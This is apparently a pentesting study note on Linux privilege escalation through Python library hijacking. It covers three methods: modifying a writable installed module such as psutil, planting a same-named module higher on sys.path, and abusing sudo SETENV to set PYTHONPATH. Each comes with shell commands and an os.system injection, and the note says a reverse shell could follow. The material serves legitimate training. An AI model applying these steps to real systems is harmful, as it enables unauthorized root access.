# Python Library Hijacking

### Wrong Write Permissions

We can use this if the python script has SUID for example

```shellscript
# Check the permissions of the python script => look for SUID
ls -la <SCRIPT>

# If we have execute rights and read write, check its contents
# Look for a library that is included (look for the imports) and the functions used
cat <SCRIPT>

# If the script imports modules and we have write access on the module we can exploit it
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# We can modify the definition of the function (the def part)
nano /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# Insert command execution in the function
import os
os.system('id')

# Execute the script => if it works, we can insert a reverse shell
sudo /usr/bin/python3 ./mem_status.py
```

### Library Path

In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

```shellscript
# Check path order
python3 -c 'import sys; print("\\n".join(sys.path))'

# Look for a library that is included (look for the imports) and the functions used
cat <SCRIPT>

# Check the default installation location
pip3 show <MODULE>

# If we have write access over a path listed above the default installation location
# we can abuse it 

# Check the permissions over a path listed before ours 
ls -la /usr/lib/python3.8

# If we have write priv over the directory path, create a python file named as the module
nano psutil.py

import os

def <USED_FUNCTION>():
    os.system('id')
    
# Execute the python script and privesc
sudo /usr/bin/python3 mem_status.py
```

### PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules

Interesting if we have sudo privs over python because we would be able to set the `PYTHONPATH` env variable

```shellscript
# Check sudo privs
sudo -l 

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

# Execute a script while setting 
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
